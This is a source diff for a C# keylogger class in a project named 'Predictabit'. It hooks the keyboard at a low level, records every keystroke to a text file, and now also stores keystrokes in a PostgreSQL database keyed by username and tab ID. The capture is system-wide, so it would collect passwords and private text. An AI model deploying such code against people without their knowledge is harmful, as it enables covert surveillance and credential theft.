@@ -4,28 +4,24 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
-using System.Windows;
+using Npgsql;
 
 namespace Predictabit
 {
     public class Keylogger
     {
-        private string logFileName = "keylogger.txt";
+        private DatabaseConnection _dbConnection;
+        private const string LogFile = "keylogger.txt";
         private DateTime lastKeyTime;
         private static LowLevelKeyboardProc _proc;
         private static IntPtr _hookID = IntPtr.Zero;
         private static readonly int IdleTimeoutSeconds = 5; // Seconds of inactivity
         private StringBuilder buffer = new StringBuilder();
 
-        public Keylogger()
+        public Keylogger(DatabaseConnection dbConnection)
         {
+            _dbConnection = dbConnection;
             lastKeyTime = DateTime.Now;
-
-            if (!File.Exists(logFileName))
-            {
-                using (File.Create(logFileName)) { }
-            }
-
             _proc = HookCallback;
             _hookID = SetHook(_proc);
         }
@@ -58,7 +54,7 @@ namespace Predictabit
                 // Check if idle time exceeds the threshold, then log the buffer
                 if (DateTime.Now - lastKeyTime >= TimeSpan.FromSeconds(IdleTimeoutSeconds))
                 {
-                    using (StreamWriter writer = File.AppendText(logFileName))
+                    using (StreamWriter writer = File.AppendText(LogFile))
                     {
                         writer.WriteLine("Key Pressed: " + buffer.ToString());
                     }
@@ -93,14 +89,14 @@ namespace Predictabit
 
         public void StartKeyLogging()
         {
-            using (StreamWriter writer = File.AppendText(logFileName))
+            using (StreamWriter writer = File.AppendText(LogFile))
             {
                 writer.WriteLine($"Keylogger started at {DateTime.Now}");
             }
 
             while (true)
             {
-                using (StreamWriter writer = File.AppendText(logFileName))
+                using (StreamWriter writer = File.AppendText(LogFile))
                 {
                     writer.WriteLine($"User stopped typing for {IdleTimeoutSeconds} seconds.");
                 }
@@ -111,7 +107,7 @@ namespace Predictabit
 
                     if (idleTime.TotalSeconds >= IdleTimeoutSeconds && buffer.Length > 0)
                     {
-                        using (StreamWriter writer = File.AppendText(logFileName))
+                        using (StreamWriter writer = File.AppendText(LogFile))
                         {
                             writer.WriteLine("Key Pressed: " + buffer.ToString());
                         }
@@ -120,6 +116,30 @@ namespace Predictabit
                     }
                     Thread.Sleep(1000);
                 }
+            }
+        }
+        
+        private void LogKeyPressed(string keyData, string username, int tabID)
+        {
+            // Insert the key press into the database
+            _dbConnection.InsertKeyLoggedData(username, tabID, keyData);
+        }
+        
+        private int GetUserId(string username)
+        {
+            string query = "SELECT user_id FROM Users WHERE username = @username";
+
+            using (NpgsqlCommand cmd = new NpgsqlCommand(query, _dbConnection.OpenConnection()))
+            {
+                cmd.Parameters.AddWithValue("username", username);
+                object result = cmd.ExecuteScalar();
+
+                if (result != null && int.TryParse(result.ToString(), out int userId))
+                {
+                    return userId;
+                }
+                
+                return -1;
             }
         }
 
